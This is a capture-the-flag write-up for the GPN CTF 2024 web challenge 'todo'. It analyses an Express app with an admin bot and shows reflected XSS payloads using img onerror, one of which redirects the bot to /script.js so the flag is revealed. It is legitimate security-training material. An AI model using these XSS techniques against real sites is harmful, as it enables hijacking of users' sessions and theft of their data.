---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: todo
ctf-category: web
ctf-difficulty: 
---
# todo

## Description

> I made a JS API! Sadly I had no time to finish it :(

## Analysis

There are two input fields:
![](_attachments/Pasted%20image%2020240601213536.png)

The first input field reflects user input:
```js
app.post('/chal', (req, res) => {
    const { html } = req.body;
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-inline';");
    res.send(`
        <script src="/script.js"></script>
        ${html}
    `);
});
```

The file `script.js` contains a pseudo-flag as a comment:
```text
class FlagAPI {
    [...]
    // TODO: Make sure that this is secure before deploying
    // getFlag() {
    //     return "GPNCTF{FAKE_FLAG_ADMINBOT_WILL_REPLACE_ME}"
    // }
}
```

When cookie with a specific random value is set, the pseudo-flag is replaced with the real flag:
```js
app.get('/script.js', (req, res) => {
    res.type('.js');
    let response = script;
    if ((req.get("cookie") || "").includes(randomBytes)) response = response.replace(/GPNCTF\{.*\}/, flag)
    res.send(response);
});
```

When a payload is submitted in the second input field, a chrome browser is started with the cookie containing the correct random value. Then, the submitted payload is typed into the first input field and a screenshot of the rendered page is shown:
```js
app.post('/admin', async (req, res) => {
    try {
        const { html } = req.body;
        const browser = await puppeteer.launch({ executablePath: process.env.BROWSER, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        page.setCookie({ name: 'flag', value: randomBytes, domain: 'localhost', path: '/', httpOnly: true });
        await page.goto('http://localhost:1337/');
        await page.type('input[name="html"]', html);
        await page.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 2000));
        const screenshot = await page.screenshot({ encoding: 'base64' });
        await browser.close();
        res.send(`<img src="data:image/png;base64,${screenshot}" />`);
    } catch(e) {console.error(e); res.send("internal error :( pls report to admins")}
});
```

## Solution

The first input field is vulnerable to reflected XSS:
```http
POST /chal HTTP/1.1
Host: never-forget-you--zara-larsson-3555.ctf.kitctf.de
[...]

html=%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E

HTTP/1.1 200 OK
[...]

        <script src="/script.js"></script>
        <img src=x onerror=alert(document.domain)>
```

The payload is executed:
![](_attachments/Pasted%20image%2020240601214244.png)

It's now possible to perform a redirect to the file `script.js` which contains the pseudo-flag:
```html
<img src=x onerror="document.location = '/script.js'">
```

When this payload is used in the admin input field, the browser containing the correct cookie will also submit this payload and redirect to the `script.js`. Because the correct cookie is set, the flag is included in the response:
![](_attachments/Pasted%20image%2020240601214641.png)